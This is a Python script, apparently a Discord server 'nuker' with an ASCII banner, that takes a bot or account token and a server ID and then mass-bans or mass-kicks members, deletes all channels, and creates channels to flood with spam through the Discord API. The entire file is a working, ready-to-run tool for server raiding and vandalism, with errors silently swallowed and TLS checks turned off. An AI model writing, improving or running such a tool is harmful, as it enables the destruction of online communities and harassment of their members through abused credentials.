import httpx
import asyncio
import os
import sys
from colorama import Fore, init
from pystyle import Colors, Colorate, Center

init(autoreset=True)

def banner():
    os.system('clear')
    logo = """
    ██╗  ██╗██████╗ ██╗██████╗  ██████╗ ██╗   ██╗
    ██║  ██║██╔══██╗██║██╔══██╗██╔═══██╗╚██╗ ██╔╝
    ███████║██████╔╝██║██║  ██║██║   ██║ ╚████╔╝ 
    ██╔══██║██╔══██╗██║██║  ██║██║   ██║  ╚██╔╝  
    ██║  ██║██║  ██║██║██████╔╝╚██████╔╝   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝    ╚═╝   
             [ FAST SPAM MODE - BY HRIDOY TOP ]
    ____________________________________________________
    """
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(logo)))

# --- Optimized Functions ---

async def fast_ban(client, g_id, m_id):
    try:
        r = await client.put(f"https://discord.com/api/v9/guilds/{g_id}/bans/{m_id}")
        if r.status_code == 204: print(f"{Fore.RED}[BANNED] {Fore.WHITE}{m_id}")
    except: pass

async def fast_kick(client, g_id, m_id):
    try:
        r = await client.delete(f"https://discord.com/api/v9/guilds/{g_id}/members/{m_id}")
        if r.status_code == 204: print(f"{Fore.YELLOW}[KICKED] {Fore.WHITE}{m_id}")
    except: pass

async def spam_channel(client, c_id, msg, count):
    for _ in range(count):
        try:
            r = await client.post(f"https://discord.com/api/v9/channels/{c_id}/messages", json={"content": msg})
            if r.status_code == 200: print(f"{Fore.MAGENTA}[SPAM] {Fore.WHITE}Sent to {c_id}")
        except: pass

async def start_process():
    banner()
    raw_token = input(f"{Fore.CYAN}[?] Token: {Fore.WHITE}").strip()
    guild_id = input(f"{Fore.CYAN}[?] Server ID: {Fore.WHITE}").strip()
    token = f"Bot {raw_token}" if len(raw_token) > 65 and not raw_token.startswith("Bot ") else raw_token
    headers = {"Authorization": token, "Content-Type": "application/json"}
    
    async with httpx.AsyncClient(headers=headers, verify=False, timeout=None) as client:
        while True:
            banner()
            print(f"{Fore.YELLOW}[1] MASS BAN   [2] MASS KICK")
            print(f"{Fore.YELLOW}[3] DELETE ALL CHANNELS")
            print(f"{Fore.YELLOW}[4] CREATE & SPAM (ULTIMATE)")
            print(f"{Fore.RED}[0] EXIT")
            choice = input(f"\n{Fore.CYAN}Hridoy_Top >> {Fore.WHITE}")

            if choice == "1" or choice == "2":
                res = await client.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000")
                if res.status_code == 200:
                    members = res.json()
                    tasks = []
                    for m in members:
                        m_id = m['user']['id']
                        tasks.append(fast_ban(client, guild_id, m_id) if choice == "1" else fast_kick(client, guild_id, m_id))
                    await asyncio.gather(*tasks)

            elif choice == "3":
                c_res = await client.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels")
                if c_res.status_code == 200:
                    await asyncio.gather(*[client.delete(f"https://discord.com/api/v9/channels/{c['id']}") for c in c_res.json()])

            elif choice == "4":
                c_name = input("Channel Name: ")
                msg = input("Spam Message: ")
                c_num = int(input("How many channels?: "))
                s_num = int(input("Messages per channel?: "))
                
                print(f"{Fore.RED}[*] Creating channels...")
                for i in range(c_num):
                    r = await client.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name": f"{c_name}-{i}", "type": 0})
                    if r.status_code == 201:
                        c_id = r.json()['id']
                        asyncio.create_task(spam_channel(client, c_id, msg, s_num))
                print(f"{Fore.GREEN}[!] Spamming started in all channels.")

            elif choice == "0": sys.exit()
            input("\nProcess Over. Press Enter...")

if __name__ == "__main__":
    asyncio.run(start_process())
